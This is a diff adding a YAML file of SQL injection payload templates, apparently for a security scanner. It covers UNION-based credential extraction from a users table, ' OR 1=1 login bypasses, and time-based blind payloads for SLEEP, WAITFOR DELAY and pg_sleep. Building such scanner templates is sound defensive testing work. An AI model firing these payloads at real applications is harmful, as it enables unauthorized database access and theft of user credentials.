@@ -1,0 +1,62 @@
+templates:
+  - id: "SQLI-UNION"
+    type: "sqli"
+    description: "SQL injection UNION SELECT payload"
+    templates:
+      - "' UNION SELECT id,username,password FROM users--"
+      - "' UNION ALL SELECT id,username,password FROM users--"
+    variables:
+      columns:
+        - "id"
+        - "username"
+        - "password"
+      tables:
+        - "users"
+    tags: 
+      - "sqli"
+      - "union"
+    metadata:
+      severity: "high"
+      technique: "union_based"
+
+  - id: "SQLI-ERROR"
+    type: "sqli"
+    description: "SQL injection error-based payload"
+    templates:
+      - "' OR '1'='1"
+      - "' OR 1=1--"
+      - "' UNION SELECT NULL,NULL FROM users--"
+    variables:
+      columns:
+        - "NULL"
+        - "NULL"
+      tables:
+        - "users"
+    tags:
+      - "sqli"
+      - "error"
+    metadata:
+      severity: "high"
+      technique: "error_based"
+
+  - id: "SQLI-TIME"
+    type: "sqli"
+    description: "Time-based blind SQL injection"
+    templates:
+      - "'; SELECT CASE WHEN (SELECT COUNT(*) FROM {{.table}}) > 0 THEN WAITFOR DELAY '0:0:{{.delays}}' ELSE 'false' END--"
+      - "'; SELECT IF((SELECT COUNT(*) FROM {{.table}}) > 0, SLEEP({{.delays}}), 0)--"
+      - "'; SELECT CASE WHEN (SELECT COUNT(*) FROM {{.table}}) > 0 THEN pg_sleep({{.delays}}) ELSE 0 END--"
+    variables:
+      delays:
+        - "5"
+      table:
+        - "users"
+      columns:
+        - "id"    # Add required columns
+        - "count"
+    tags:
+      - "sqli"
+      - "time-based"
+    metadata:
+      severity: "high"
+      technique: "time_based"
